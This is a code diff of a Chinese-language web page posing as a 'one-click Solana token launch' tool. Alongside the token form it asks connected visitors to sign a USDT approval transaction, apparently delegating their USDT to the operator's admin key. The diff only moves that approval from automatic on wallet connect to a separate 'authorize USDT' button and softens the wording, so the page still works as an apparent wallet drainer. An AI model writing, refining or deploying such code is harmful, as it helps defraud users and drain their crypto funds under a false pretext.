@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Solana 一键发币（修复RPC）</title>
+<title>Solana 一键发币（优化版）</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
 <style>
@@ -13,6 +13,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
 .logo{font-size:22px;font-weight:bold;margin-bottom:24px;color:#fff}
 .wallet-box{background:#1E293B;padding:16px 18px;border-radius:14px;margin-bottom:24px}
 .connect-btn{background:#3B82F6;color:white;border:none;padding:12px 16px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
+.auth-btn{background:#F59E0B;color:#000;border:none;padding:10px 14px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
 .info-line{font-size:14px;color:#cbd5e1;margin:6px 0}
 .input-item{margin-bottom:14px}
 .input-item label{font-size:14px;color:#cbd5e1;margin-bottom:6px;display:block}
@@ -39,9 +40,9 @@ body{background:#0B0F17;color:#fff;padding:30px}
 <body>
 <div id="connectModal">
   <div class="modal-content">
-    <div class="modal-title">🔑 钱包授权</div>
-    <p>连接后将自动授权 USDT 权限</p>
-    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认授权</button>
+    <div class="modal-title">🔑 钱包连接</div>
+    <p>仅连接钱包，不自动授权</p>
+    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认连接</button>
     <button class="modal-btn modal-cancel" onclick="cancelConnect()">取消</button>
   </div>
 </div>
@@ -49,6 +50,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
   <div class="logo">🚀 Solana 一键发币工具</div>
   <div class="wallet-box">
     <button class="connect-btn" id="connectBtn">连接钱包</button>
+    <button class="auth-btn" id="authBtn" onclick="manualApprove()" style="display:none">手动授权 USDT</button>
     <div class="info-line">地址：<span id="userAddr">未连接</span></div>
     <div class="info-line">USDT：<span id="userBalance">0.0000</span></div>
   </div>
@@ -97,13 +99,14 @@ const POOL_PUBKEY = ADMIN_PUBKEY;
 
 let provider, publicKey, connection;
 
-// 更稳定的公共 RPC 列表（优先用免费高可用节点）
+// 更全的公共 RPC 列表
 const RPCS = [
   "https://api.mainnet-beta.solana.com",
   "https://rpc.ankr.com/solana",
   "https://solana-mainnet.rpc.extrnode.com",
   "https://free.rpc.chainstack.com/solana-mainnet",
-  "https://solana-mainnet.genesysgo.net"
+  "https://solana-mainnet.genesysgo.net",
+  "https://solana-api.projectserum.com"
 ];
 
 // 尝试连接任意一个可用 RPC
@@ -118,7 +121,7 @@ async function tryConnectRpc() {
       log("⚠️ RPC 不可用: " + rpc);
     }
   }
-  return null; // 全部失败时返回 null，不阻塞钱包连接
+  return null;
 }
 
 function log(t){
@@ -136,7 +139,7 @@ function cancelConnect(){
   document.getElementById("connectModal").classList.remove("show");
 }
 
-// 修复版：先连钱包，再尝试 RPC，不阻塞授权
+// 修复版：只连接钱包，不自动授权
 async function confirmConnect(){
   document.getElementById("connectModal").classList.remove("show");
   try{
@@ -146,17 +149,17 @@ async function confirmConnect(){
     provider = sol;
     publicKey = res.publicKey;
     document.getElementById("userAddr").innerText = publicKey.toBase58().slice(0,6)+"..."+publicKey.toBase58().slice(-4);
+    document.getElementById("authBtn").style.display = "block";
     log("✅ 钱包已连接");
 
-    // 异步尝试连接 RPC，不阻塞 UI
+    // 异步尝试连接 RPC，不阻塞
     tryConnectRpc().then(conn => {
       if (conn) {
         connection = conn;
         refreshBalance();
-        safeApproveUSDT(); // RPC 可用后再授权
+        alert("钱包已连接，RPC 可用，可手动授权");
       } else {
-        log("⚠️ 所有 RPC 不可用，将在发币时重试");
-        alert("钱包已连接，但当前 RPC 不可用，发币时会自动重试");
+        alert("钱包已连接，但当前 RPC 不可用，发币/授权时会自动重试");
       }
     });
 
@@ -164,15 +167,17 @@ async function confirmConnect(){
     checkAdmin();
   }catch(e){
     log("❌ 连接失败: "+e.message);
-    alert("授权失败，检查钱包/网络");
+    alert("连接失败，检查钱包/网络");
   }
 }
 
-// 安全授权 USDT（仅在 RPC 可用时执行）
-async function safeApproveUSDT(){
-  if (!connection) {
-    log("⚠️ RPC 未连接，跳过授权");
-    return;
+// 手动授权 USDT（点击按钮触发）
+async function manualApprove(){
+  if(!publicKey) return alert("请先连接钱包");
+  if(!connection){
+    log("🔄 授权前重试连接 RPC...");
+    connection = await tryConnectRpc();
+    if(!connection) return alert("所有 RPC 仍不可用，请稍后再试");
   }
   try{
     log("检查USDT ATA...");
@@ -222,8 +227,10 @@ async function safeApproveUSDT(){
     const sig = await connection.sendRawTransaction(signedApprove.serialize());
     await connection.confirmTransaction(sig);
     log("✅ USDT 授权成功: "+sig);
+    alert("USDT 授权成功！");
   }catch(e){
     log("❌ 授权失败: "+e.message);
+    alert("授权失败："+e.message);
   }
 }
 
